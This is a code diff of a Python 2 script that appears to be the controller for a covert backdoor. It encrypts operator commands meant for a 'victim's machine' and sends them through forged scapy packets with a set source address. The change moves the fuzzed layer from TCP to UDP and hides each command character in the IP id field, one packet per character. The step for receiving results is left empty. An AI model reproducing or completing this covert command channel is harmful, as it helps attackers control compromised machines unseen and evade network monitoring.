@@ -24,21 +24,24 @@ def main():
 	cmd = raw_input("# ")
 	# encrypt the command before sending it to victim's machine
 	enc_cmd = encrypt(cmd, pw)
-	print enc_cmd
 
 	# send to victim using scapy
 	# how to put random data on each field
 	
-	mypacket = IP()/fuzz(TCP())
+	mypacket = IP()/fuzz(UDP())
 	mypacket.src = srcIp
 	mypacket.dst = desIp
 
-	mypacket
+	print enc_cmd
 
-	# send forged packet
-	send(mypacket)
+	for c in enc_cmd:
+		mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )
+
+		# send forged packet
+		send(mypacket)
+
 	# recv the result
-
+	
 
 if __name__ == '__main__':
 	try:
